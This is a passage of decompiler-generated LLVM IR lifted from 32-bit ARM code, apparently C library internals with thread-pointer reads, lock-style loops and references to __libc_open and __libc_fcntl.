bb57:                                             ; preds = %.thread8, %dec_label_pc_16480, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_164bc = load i32, i32* @r8, align 4
  %v2_164bc = add i32 %v0_164bc, 92
  %v3_164bc = inttoptr i32 %v2_164bc to i32*
  %v4_164bc = load i32, i32* %v3_164bc, align 4
  store i32 %v4_164bc, i32* %r3.global-to-local, align 4
  %v2_164c0 = load i32, i32* @r5, align 4
  %v3_164c0 = add i32 %v2_164c0, 2
  %v4_164c0 = inttoptr i32 %v3_164c0 to i8*
  store i8 0, i8* %v4_164c0, align 1
  %v0_164c4 = load i32, i32* @r5, align 4
  %v1_164c4 = inttoptr i32 %v0_164c4 to i16*
  %v2_164c4 = load i16, i16* %v1_164c4, align 2
  %v3_164c4 = zext i16 %v2_164c4 to i32
  store i32 %v3_164c4, i32* %r2.global-to-local, align 4
  %v0_164c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_164c8 = inttoptr i32 %v0_164c8 to i32*
  %v2_164c8 = load i32, i32* %v1_164c8, align 4
  store i32 %v2_164c8, i32* @r1, align 4
  %v1_164cc = add i32 %v0_164c4, 8
  %v2_164cc = inttoptr i32 %v1_164cc to i32*
  %v3_164cc = load i32, i32* %v2_164cc, align 4
  store i32 %v3_164cc, i32* %r3.global-to-local, align 4
  %v1_164d0 = and i32 %v3_164c4, 8192
  %v2_164d0 = icmp eq i32 %v1_164d0, 0
  %v2_164d4 = add i32 %v0_164c4, 20
  %v3_164d4 = inttoptr i32 %v2_164d4 to i32*
  store i32 %v3_164cc, i32* %v3_164d4, align 4
  %v0_164d8 = load i32, i32* @r1, align 4
  %v1_164d8 = load i32, i32* @r5, align 4
  %v2_164d8 = add i32 %v1_164d8, 52
  %v3_164d8 = inttoptr i32 %v2_164d8 to i32*
  store i32 %v0_164d8, i32* %v3_164d8, align 4
  %v0_164dc = load i32, i32* %r3.global-to-local, align 4
  %v1_164dc = load i32, i32* @r5, align 4
  %v2_164dc = add i32 %v1_164dc, 24
  %v3_164dc = inttoptr i32 %v2_164dc to i32*
  store i32 %v0_164dc, i32* %v3_164dc, align 4
  %v0_164e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_164e0 = load i32, i32* @r5, align 4
  %v2_164e0 = add i32 %v1_164e0, 28
  %v3_164e0 = inttoptr i32 %v2_164e0 to i32*
  store i32 %v0_164e0, i32* %v3_164e0, align 4
  %v0_164e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_164e4 = load i32, i32* @r5, align 4
  %v2_164e4 = add i32 %v1_164e4, 16
  %v3_164e4 = inttoptr i32 %v2_164e4 to i32*
  store i32 %v0_164e4, i32* %v3_164e4, align 4
  %v0_164e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_164e8 = load i32, i32* @r5, align 4
  %v2_164e8 = add i32 %v1_164e8, 44
  %v3_164e8 = inttoptr i32 %v2_164e8 to i32*
  store i32 %v0_164e8, i32* %v3_164e8, align 4
  br i1 %v2_164d0, label %dec_label_pc_166d0, label %dec_label_pc_164f0

dec_label_pc_164f0:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_164f4 = load i32, i32* @r8, align 4
  %v2_164f4 = add i32 %v0_164f4, 160
  %v3_164f4 = inttoptr i32 %v2_164f4 to i32*
  %v4_164f4 = load i32, i32* %v3_164f4, align 4
  store i32 %v4_164f4, i32* %r7.global-to-local, align 4
  %v0_164f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_164f8, i32* %r0.global-to-local, align 4
  %v1_164fc = add i32 %v4_164f4, 8
  %v2_164fc = inttoptr i32 %v1_164fc to i32*
  %v3_164fc = load i32, i32* %v2_164fc, align 4
  store i32 %v3_164fc, i32* %r3.global-to-local, align 4
  %v1_16500 = add i32 %v0_164f8, -1168
  store i32 %v1_16500, i32* %r6.global-to-local, align 4
  %v3_16504 = icmp uge i32 %v3_164fc, %v1_16500
  store i1 %v3_16504, i1* %cpsr_c.global-to-local, align 1
  %v9_16504 = icmp eq i32 %v3_164fc, %v1_16500
  br i1 %v9_16504, label %dec_label_pc_16548, label %dec_label_pc_1650c

dec_label_pc_1650c:                               ; preds = %dec_label_pc_164f0
  store i32 %v4_164f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16514

dec_label_pc_16514:                               ; preds = %dec_label_pc_16520.dec_label_pc_16514_crit_edge, %dec_label_pc_1650c
  %v0_16514 = phi i32 [ %v0_16514.pre, %dec_label_pc_16520.dec_label_pc_16514_crit_edge ], [ %v4_164f4, %dec_label_pc_1650c ]
  %v1_16514 = inttoptr i32 %v0_16514 to i32*
  %v2_16514 = load i32, i32* %v1_16514, align 4
  store i32 %v2_16514, i32* %r3.global-to-local, align 4
  %v1_16518 = load i32, i32* %r4.global-to-local, align 4
  %v3_16518 = icmp uge i32 %v2_16514, %v1_16518
  store i1 %v3_16518, i1* %cpsr_c.global-to-local, align 1
  %v9_16518 = icmp eq i32 %v2_16514, %v1_16518
  br i1 %v9_16518, label %dec_label_pc_16520, label %dec_label_pc_16538

dec_label_pc_16520:                               ; preds = %dec_label_pc_16514
  store i32 %v2_16514, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16530 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16530, label %dec_label_pc_16534, label %dec_label_pc_16520.dec_label_pc_16514_crit_edge

dec_label_pc_16520.dec_label_pc_16514_crit_edge:  ; preds = %dec_label_pc_16520
  %v0_16514.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16514

dec_label_pc_16534:                               ; preds = %dec_label_pc_16520
  %v0_16534 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16534, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16538

dec_label_pc_16538:                               ; preds = %dec_label_pc_16514, %dec_label_pc_16534
  %v0_16538 = phi i32 [ %v0_16534, %dec_label_pc_16534 ], [ %v2_16514, %dec_label_pc_16514 ]
  %v1_16538 = phi i32 [ %v0_16534, %dec_label_pc_16534 ], [ %v1_16518, %dec_label_pc_16514 ]
  %v3_16538 = icmp uge i32 %v0_16538, %v1_16538
  store i1 %v3_16538, i1* %cpsr_c.global-to-local, align 1
  %v9_16538 = icmp eq i32 %v0_16538, %v1_16538
  br i1 %v9_16538, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_16538
  %v1_1653c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1653c, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_16538, %bb58
  %v1_16540 = xor i1 %v9_16538, true
  call void @__pseudo_cond_branch(i1 %v1_16540, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_16544 = load i32, i32* %r6.global-to-local, align 4
  %v1_16544 = load i32, i32* %r7.global-to-local, align 4
  %v2_16544 = add i32 %v1_16544, 8
  %v3_16544 = inttoptr i32 %v2_16544 to i32*
  store i32 %v0_16544, i32* %v3_16544, align 4
  %v1_16564.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16548:                               ; preds = %dec_label_pc_164f0, %bb59
  %v1_16564 = phi i32 [ %v3_164fc, %dec_label_pc_164f0 ], [ %v1_16564.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1654c = load i32, i32* @r8, align 4
  %v2_1654c = add i32 %v0_1654c, 160
  %v3_1654c = inttoptr i32 %v2_1654c to i32*
  %v4_1654c = load i32, i32* %v3_1654c, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16554 = add i32 %v0_1654c, 152
  %v3_16554 = inttoptr i32 %v2_16554 to i32*
  %v4_16554 = load i32, i32* %v3_16554, align 4
  store i32 %v4_16554, i32* %r7.global-to-local, align 4
  %v1_16558 = add i32 %v4_1654c, 4
  %v2_16558 = inttoptr i32 %v1_16558 to i32*
  %v3_16558 = load i32, i32* %v2_16558, align 4
  store i32 %v3_16558, i32* %r3.global-to-local, align 4
  %v1_1655c = add i32 %v4_16554, 8
  %v2_1655c = inttoptr i32 %v1_1655c to i32*
  %v3_1655c = load i32, i32* %v2_1655c, align 4
  store i32 %v3_1655c, i32* %r2.global-to-local, align 4
  %v1_16560 = add i32 %v3_16558, 1
  store i32 %v1_16560, i32* %r3.global-to-local, align 4
  %v3_16564 = icmp uge i32 %v3_1655c, %v1_16564
  store i1 %v3_16564, i1* %cpsr_c.global-to-local, align 1
  %v9_16564 = icmp eq i32 %v3_1655c, %v1_16564
  store i32 %v1_16560, i32* %v2_16558, align 4
  br i1 %v9_16564, label %dec_label_pc_165b0, label %dec_label_pc_16570

dec_label_pc_16570:                               ; preds = %dec_label_pc_16548
  %v0_16574 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16574, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1657c95 = inttoptr i32 %v0_16574 to i32*
  %v2_1657c96 = load i32, i32* %v1_1657c95, align 4
  store i32 %v2_1657c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1658098 = icmp eq i32 %v2_1657c96, 0
  br i1 %v9_1658098, label %dec_label_pc_16588, label %dec_label_pc_165a0

dec_label_pc_16588:                               ; preds = %dec_label_pc_16570, %dec_label_pc_16588.dec_label_pc_1657c_crit_edge
  %v0_1658899 = phi i32 [ %v1_16580.pre, %dec_label_pc_16588.dec_label_pc_1657c_crit_edge ], [ 0, %dec_label_pc_16570 ]
  store i32 %v0_1658899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16598 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16598, label %dec_label_pc_1659c, label %dec_label_pc_16588.dec_label_pc_1657c_crit_edge

dec_label_pc_16588.dec_label_pc_1657c_crit_edge:  ; preds = %dec_label_pc_16588
  %v0_1657c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16580.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1657c = inttoptr i32 %v0_1657c.pre to i32*
  %v2_1657c = load i32, i32* %v1_1657c, align 4
  store i32 %v2_1657c, i32* %r3.global-to-local, align 4
  %v3_16580 = icmp uge i32 %v2_1657c, %v1_16580.pre
  store i1 %v3_16580, i1* %cpsr_c.global-to-local, align 1
  %v9_16580 = icmp eq i32 %v2_1657c, %v1_16580.pre
  br i1 %v9_16580, label %dec_label_pc_16588, label %dec_label_pc_165a0

dec_label_pc_1659c:                               ; preds = %dec_label_pc_16588
  %v0_1659c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1659c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_165a0

dec_label_pc_165a0:                               ; preds = %dec_label_pc_16570, %dec_label_pc_16588.dec_label_pc_1657c_crit_edge, %dec_label_pc_1659c
  %v0_165a0 = phi i32 [ %v0_1659c, %dec_label_pc_1659c ], [ %v2_1657c96, %dec_label_pc_16570 ], [ %v2_1657c, %dec_label_pc_16588.dec_label_pc_1657c_crit_edge ]
  %v1_165a0 = phi i32 [ %v0_1659c, %dec_label_pc_1659c ], [ 0, %dec_label_pc_16570 ], [ %v1_16580.pre, %dec_label_pc_16588.dec_label_pc_1657c_crit_edge ]
  %v3_165a0 = icmp uge i32 %v0_165a0, %v1_165a0
  store i1 %v3_165a0, i1* %cpsr_c.global-to-local, align 1
  %v9_165a0 = icmp eq i32 %v0_165a0, %v1_165a0
  br i1 %v9_165a0, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_165a0
  %v1_165a4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_165a4, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_165a0, %bb60
  %v1_165a8 = xor i1 %v9_165a0, true
  call void @__pseudo_cond_branch(i1 %v1_165a8, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_165ac = load i32, i32* %r6.global-to-local, align 4
  %v1_165ac = load i32, i32* %r7.global-to-local, align 4
  %v2_165ac = add i32 %v1_165ac, 8
  %v3_165ac = inttoptr i32 %v2_165ac to i32*
  store i32 %v0_165ac, i32* %v3_165ac, align 4
  br label %dec_label_pc_165b0

dec_label_pc_165b0:                               ; preds = %dec_label_pc_16548, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_165b4 = load i32, i32* @r8, align 4
  %v2_165b4 = add i32 %v0_165b4, 152
  %v3_165b4 = inttoptr i32 %v2_165b4 to i32*
  %v4_165b4 = load i32, i32* %v3_165b4, align 4
  store i32 %v4_165b4, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_165bc = add i32 %v0_165b4, 76
  %v3_165bc = inttoptr i32 %v2_165bc to i32*
  %v4_165bc = load i32, i32* %v3_165bc, align 4
  store i32 %v4_165bc, i32* @r1, align 4
  %v1_165c0 = add i32 %v4_165b4, 4
  %v2_165c0 = inttoptr i32 %v1_165c0 to i32*
  %v3_165c0 = load i32, i32* %v2_165c0, align 4
  store i32 %v3_165c0, i32* %r3.global-to-local, align 4
  %v1_165c4 = inttoptr i32 %v4_165bc to i32*
  %v2_165c4 = load i32, i32* %v1_165c4, align 4
  store i32 %v2_165c4, i32* %r2.global-to-local, align 4
  %v1_165c8 = add i32 %v3_165c0, 1
  store i32 %v1_165c8, i32* %r3.global-to-local, align 4
  store i32 %v1_165c8, i32* %v2_165c0, align 4
  %v0_165d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_165d0 = load i32, i32* @r5, align 4
  %v2_165d0 = add i32 %v1_165d0, 32
  %v3_165d0 = inttoptr i32 %v2_165d0 to i32*
  store i32 %v0_165d0, i32* %v3_165d0, align 4
  %v0_165d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_165d4 = add i32 %v0_165d4, 4
  %v2_165d4 = inttoptr i32 %v1_165d4 to i32*
  %v3_165d4 = load i32, i32* %v2_165d4, align 4
  %v1_165d8 = add i32 %v3_165d4, -1
  store i32 %v1_165d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165dc = icmp eq i32 %v1_165d8, 0
  %v0_165e0 = load i32, i32* @r5, align 4
  %v1_165e0 = load i32, i32* @r1, align 4
  %v2_165e0 = inttoptr i32 %v1_165e0 to i32*
  store i32 %v0_165e0, i32* %v2_165e0, align 4
  %v0_165e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_165e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_165e4 = add i32 %v1_165e4, 4
  %v3_165e4 = inttoptr i32 %v2_165e4 to i32*
  store i32 %v0_165e4, i32* %v3_165e4, align 4
  br i1 %v2_165dc, label %dec_label_pc_165ec, label %dec_label_pc_1664c

dec_label_pc_165ec:                               ; preds = %dec_label_pc_165b0
  %v0_165ec = load i32, i32* %r3.global-to-local, align 4
  %v1_165ec = load i32, i32* %r0.global-to-local, align 4
  %v2_165ec = add i32 %v1_165ec, 8
  %v3_165ec = inttoptr i32 %v2_165ec to i32*
  store i32 %v0_165ec, i32* %v3_165ec, align 4
  %v0_165f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_165f0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165f4

dec_label_pc_165f4:                               ; preds = %dec_label_pc_16624.dec_label_pc_165f4_crit_edge, %dec_label_pc_165ec
  %v0_165f4 = phi i32 [ %v0_165f4.pre, %dec_label_pc_16624.dec_label_pc_165f4_crit_edge ], [ %v0_165f0, %dec_label_pc_165ec ]
  %v1_165f4 = inttoptr i32 %v0_165f4 to i32*
  %v2_165f4 = load i32, i32* %v1_165f4, align 4
  store i32 %v2_165f4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_165f4, i32* %r2.global-to-local, align 4
  %v2_1660083 = load i32, i32* %v1_165f4, align 4
  store i32 %v2_1660083, i32* %r3.global-to-local, align 4
  %v3_1660485 = icmp uge i32 %v2_1660083, %v2_165f4
  store i1 %v3_1660485, i1* %cpsr_c.global-to-local, align 1
  %v9_1660491 = icmp eq i32 %v2_1660083, %v2_165f4
  br i1 %v9_1660491, label %dec_label_pc_1660c, label %dec_label_pc_16624

dec_label_pc_1660c:                               ; preds = %dec_label_pc_165f4, %dec_label_pc_1660c.dec_label_pc_16600_crit_edge
  %v0_1660c92 = phi i32 [ %v1_16604.pre, %dec_label_pc_1660c.dec_label_pc_16600_crit_edge ], [ %v2_165f4, %dec_label_pc_165f4 ]
  store i32 %v0_1660c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1661c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1661c, label %dec_label_pc_16620, label %dec_label_pc_1660c.dec_label_pc_16600_crit_edge

dec_label_pc_1660c.dec_label_pc_16600_crit_edge:  ; preds = %dec_label_pc_1660c
  %v0_16600.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16604.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16600 = inttoptr i32 %v0_16600.pre to i32*
  %v2_16600 = load i32, i32* %v1_16600, align 4
  store i32 %v2_16600, i32* %r3.global-to-local, align 4
  %v3_16604 = icmp uge i32 %v2_16600, %v1_16604.pre
  store i1 %v3_16604, i1* %cpsr_c.global-to-local, align 1
  %v9_16604 = icmp eq i32 %v2_16600, %v1_16604.pre
  br i1 %v9_16604, label %dec_label_pc_1660c, label %dec_label_pc_16624

dec_label_pc_16620:                               ; preds = %dec_label_pc_1660c
  %v0_16620 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16620, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16624

dec_label_pc_16624:                               ; preds = %dec_label_pc_165f4, %dec_label_pc_1660c.dec_label_pc_16600_crit_edge, %dec_label_pc_16620
  %v0_1662c = phi i32 [ %v0_16620, %dec_label_pc_16620 ], [ %v2_1660083, %dec_label_pc_165f4 ], [ %v2_16600, %dec_label_pc_1660c.dec_label_pc_16600_crit_edge ]
  %v1_16624 = phi i32 [ %v0_16620, %dec_label_pc_16620 ], [ %v2_165f4, %dec_label_pc_165f4 ], [ %v1_16604.pre, %dec_label_pc_1660c.dec_label_pc_16600_crit_edge ]
  %v3_16624 = icmp uge i32 %v0_1662c, %v1_16624
  store i1 %v3_16624, i1* %cpsr_c.global-to-local, align 1
  %v9_16624 = icmp eq i32 %v0_1662c, %v1_16624
  br i1 %v9_16624, label %dec_label_pc_1662c, label %dec_label_pc_16624.dec_label_pc_165f4_crit_edge

dec_label_pc_16624.dec_label_pc_165f4_crit_edge:  ; preds = %dec_label_pc_16624
  %v0_165f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165f4

dec_label_pc_1662c:                               ; preds = %dec_label_pc_16624
  %v2_1662c = icmp ne i32 %v1_16624, 0
  store i1 %v2_1662c, i1* %cpsr_c.global-to-local, align 1
  %v7_16630 = icmp slt i32 %v1_16624, 2
  br i1 %v7_16630, label %dec_label_pc_1664c, label %dec_label_pc_16634

dec_label_pc_16634:                               ; preds = %dec_label_pc_1662c
  %v0_16634 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16634, i32* %r0.global-to-local, align 4
  %v0_16638 = load i32, i32* @r1, align 4
  %v1_16638 = add i32 %v0_16638, 129
  store i32 %v1_16638, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1664c

dec_label_pc_1664c:                               ; preds = %dec_label_pc_165b0, %dec_label_pc_16634, %dec_label_pc_1662c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16650 = load i32, i32* @r8, align 4
  %v2_16650 = add i32 %v0_16650, 160
  %v3_16650 = inttoptr i32 %v2_16650 to i32*
  %v4_16650 = load i32, i32* %v3_16650, align 4
  store i32 %v4_16650, i32* %r0.global-to-local, align 4
  %v1_16654 = add i32 %v4_16650, 4
  %v2_16654 = inttoptr i32 %v1_16654 to i32*
  %v3_16654 = load i32, i32* %v2_16654, align 4
  %v1_16658 = add i32 %v3_16654, -1
  store i32 %v1_16658, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1665c = icmp eq i32 %v1_16658, 0
  store i32 %v1_16658, i32* %v2_16654, align 4
  br i1 %v2_1665c, label %dec_label_pc_16668, label %dec_label_pc_166d0

dec_label_pc_16668:                               ; preds = %dec_label_pc_1664c
  %v0_16668 = load i32, i32* %r3.global-to-local, align 4
  %v1_16668 = load i32, i32* %r0.global-to-local, align 4
  %v2_16668 = add i32 %v1_16668, 8
  %v3_16668 = inttoptr i32 %v2_16668 to i32*
  store i32 %v0_16668, i32* %v3_16668, align 4
  %v0_1666c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1666c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16670

dec_label_pc_16670:                               ; preds = %dec_label_pc_166a0.dec_label_pc_16670_crit_edge, %dec_label_pc_16668
  %v0_16670 = phi i32 [ %v0_16670.pre, %dec_label_pc_166a0.dec_label_pc_16670_crit_edge ], [ %v0_1666c, %dec_label_pc_16668 ]
  %v1_16670 = inttoptr i32 %v0_16670 to i32*
  %v2_16670 = load i32, i32* %v1_16670, align 4
  store i32 %v2_16670, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16670, i32* %r2.global-to-local, align 4
  %v2_1667c71 = load i32, i32* %v1_16670, align 4
  store i32 %v2_1667c71, i32* %r3.global-to-local, align 4
  %v3_1668073 = icmp uge i32 %v2_1667c71, %v2_16670
  store i1 %v3_1668073, i1* %cpsr_c.global-to-local, align 1
  %v9_1668079 = icmp eq i32 %v2_1667c71, %v2_16670
  br i1 %v9_1668079, label %dec_label_pc_16688, label %dec_label_pc_166a0

dec_label_pc_16688:                               ; preds = %dec_label_pc_16670, %dec_label_pc_16688.dec_label_pc_1667c_crit_edge
  %v0_1668880 = phi i32 [ %v1_16680.pre, %dec_label_pc_16688.dec_label_pc_1667c_crit_edge ], [ %v2_16670, %dec_label_pc_16670 ]
  store i32 %v0_1668880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16698 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16698, label %dec_label_pc_1669c, label %dec_label_pc_16688.dec_label_pc_1667c_crit_edge

dec_label_pc_16688.dec_label_pc_1667c_crit_edge:  ; preds = %dec_label_pc_16688
  %v0_1667c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16680.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1667c = inttoptr i32 %v0_1667c.pre to i32*
  %v2_1667c = load i32, i32* %v1_1667c, align 4
  store i32 %v2_1667c, i32* %r3.global-to-local, align 4
  %v3_16680 = icmp uge i32 %v2_1667c, %v1_16680.pre
  store i1 %v3_16680, i1* %cpsr_c.global-to-local, align 1
  %v9_16680 = icmp eq i32 %v2_1667c, %v1_16680.pre
  br i1 %v9_16680, label %dec_label_pc_16688, label %dec_label_pc_166a0

dec_label_pc_1669c:                               ; preds = %dec_label_pc_16688
  %v0_1669c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1669c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166a0

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16670, %dec_label_pc_16688.dec_label_pc_1667c_crit_edge, %dec_label_pc_1669c
  %v0_166a8 = phi i32 [ %v0_1669c, %dec_label_pc_1669c ], [ %v2_1667c71, %dec_label_pc_16670 ], [ %v2_1667c, %dec_label_pc_16688.dec_label_pc_1667c_crit_edge ]
  %v1_166a0 = phi i32 [ %v0_1669c, %dec_label_pc_1669c ], [ %v2_16670, %dec_label_pc_16670 ], [ %v1_16680.pre, %dec_label_pc_16688.dec_label_pc_1667c_crit_edge ]
  %v3_166a0 = icmp uge i32 %v0_166a8, %v1_166a0
  store i1 %v3_166a0, i1* %cpsr_c.global-to-local, align 1
  %v9_166a0 = icmp eq i32 %v0_166a8, %v1_166a0
  br i1 %v9_166a0, label %dec_label_pc_166a8, label %dec_label_pc_166a0.dec_label_pc_16670_crit_edge

dec_label_pc_166a0.dec_label_pc_16670_crit_edge:  ; preds = %dec_label_pc_166a0
  %v0_16670.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16670

dec_label_pc_166a8:                               ; preds = %dec_label_pc_166a0
  %v2_166a8 = icmp ne i32 %v1_166a0, 0
  store i1 %v2_166a8, i1* %cpsr_c.global-to-local, align 1
  %v7_166ac = icmp slt i32 %v1_166a0, 2
  br i1 %v7_166ac, label %dec_label_pc_166d0, label %dec_label_pc_166b0

dec_label_pc_166b0:                               ; preds = %dec_label_pc_166a8
  %v0_166b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_166b0, i32* %r0.global-to-local, align 4
  %v0_166b4 = load i32, i32* @r1, align 4
  %v1_166b4 = add i32 %v0_166b4, 129
  store i32 %v1_166b4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_166d0

dec_label_pc_166cc:                               ; preds = %dec_label_pc_16310, %dec_label_pc_162f4, %dec_label_pc_1631c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_166d0

dec_label_pc_166d0:                               ; preds = %dec_label_pc_1664c, %dec_label_pc_166a8, %bb57, %dec_label_pc_16354, %dec_label_pc_166b0, %dec_label_pc_166cc
  %v0_166d0 = load i32, i32* @r5, align 4
  store i32 %v0_166d0, i32* %r0.global-to-local, align 4
  %v2_166d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_166d8, i32* %r4.global-to-local, align 4
  store i32 %v6_162b4, i32* @r5, align 4
  store i32 %v9_162b4, i32* @r6, align 4
  store i32 %v12_162b4, i32* @r7, align 4
  store i32 %v15_162b4, i32* @r8, align 4
  ret i32 %v0_166d0

; uselistorder directives
  uselistorder i32 %v0_1669c, { 1, 0, 2 }
  uselistorder i32 %v1_16680.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16670, { 1, 0 }
  uselistorder i32 %v0_16620, { 1, 0, 2 }
  uselistorder i32 %v1_16604.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_165f4, { 1, 0 }
  uselistorder i32 %v0_1659c, { 1, 0, 2 }
  uselistorder i32 %v1_16580.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16534, { 1, 0, 2 }
  uselistorder i32 %v1_16518, { 0, 2, 1 }
  uselistorder i32 %v4_164f4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_164a4.pre, { 2, 1, 0 }
  uselistorder i32 %v0_16428, { 1, 2, 0 }
  uselistorder i32 %v1_163b8, { 1, 0 }
  uselistorder i32 %v0_163b8, { 1, 0 }
  uselistorder i32 %v1_163a0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16344, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 5, 2, 7, 8, 9, 10, 11, 13, 12, 53, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 1, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 34, 35, 4, 5, 6, 7, 36, 37, 8, 9, 11, 10, 0, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 16384, { 75, 76, 0, 77, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 18, 74, 17, 64, 16, 52, 36, 53, 3, 54, 4, 55, 5, 56, 37, 57, 6, 58, 7, 59, 8, 60, 9, 61, 10, 62, 11, 63, 35, 65, 12, 66, 13, 67, 44, 80, 14, 81, 15, 82, 19, 78, 45, 79, 21, 83, 47, 84, 48, 85, 49, 86, 20, 87, 46, 88, 89, 22, 90, 23, 91, 24, 92, 50, 93, 25, 1, 26, 94, 27, 95, 29, 96, 28, 97, 31, 98, 30, 99, 51, 100, 32, 2, 33, 101, 34, 102 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 16, 0, 15, 12, 11, 2, 1, 14, 13, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 2, 3, 4, 0, 5, 1, 6 }
